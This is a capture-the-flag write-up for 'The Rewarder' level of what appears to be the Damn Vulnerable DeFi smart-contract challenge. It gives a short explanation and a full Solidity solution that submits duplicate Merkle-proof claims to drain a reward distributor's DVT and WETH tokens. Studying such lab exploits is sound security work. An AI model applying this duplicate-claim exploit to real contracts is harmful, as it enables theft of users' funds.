# 5. The Rewarder

- The exploit in this level is a logic flaw in the if checks in the main logic of the contract
- Concepts explored in this level include:

## Merkle tree

- https://www.youtube.com/watch?v=n6nEPaE7KZ8

## Bitwise operators

- https://www.cyfrin.io/glossary/bitwise-operators-solidity-code-example
- The bitwise operations are used here for gas optimisations - they are not part of the exploit but are interesting nonetheless

## Solution

```solidity
function test_theRewarder() public checkSolvedByPlayer {
    uint256 playerLeafIndex = 188;
    uint256 playerDvtAmount = 11524763827831882;
    uint256 playerWethAmount = 1171088749244340;

    uint256 dvtClaims = dvt.balanceOf(address(distributor)) / playerDvtAmount;
    uint256 wethClaims = weth.balanceOf(address(distributor)) / playerWethAmount;

    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    Claim[] memory claims = new Claim[](dvtClaims + wethClaims);

    for (uint256 i = 0; i < dvtClaims; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: playerDvtAmount,
            tokenIndex: 0,
            proof: merkle.getProof(dvtLeaves, playerLeafIndex)
        });
    }

    for (uint256 i = 0; i < wethClaims; i++) {
        claims[i + dvtClaims] = Claim({
            batchNumber: 0,
            amount: playerWethAmount,
            tokenIndex: 1,
            proof: merkle.getProof(wethLeaves, playerLeafIndex)
        });
    }

    distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

    dvt.transfer(recovery, dvt.balanceOf(address(player)));
    weth.transfer(recovery, weth.balanceOf(address(player)));

    console.log("recovery dvt balance", dvt.balanceOf(recovery));
    console.log("distributor leftover dvt balance", dvt.balanceOf(address(distributor)));
    console.log("recovery weth balance", weth.balanceOf(recovery));
    console.log("distributor leftover weth balance", weth.balanceOf(address(distributor)));
}
```
